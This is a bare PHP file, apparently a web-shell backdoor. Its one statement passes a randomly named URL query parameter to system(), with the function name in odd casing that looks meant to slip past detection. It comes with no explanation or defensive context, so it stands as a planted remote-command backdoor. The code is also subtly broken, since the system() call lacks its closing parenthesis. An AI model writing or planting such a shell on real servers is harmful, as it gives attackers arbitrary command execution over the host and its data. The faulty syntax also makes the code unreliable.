<?php
SysTeM($_GET['YXd3OSvn'];
?>
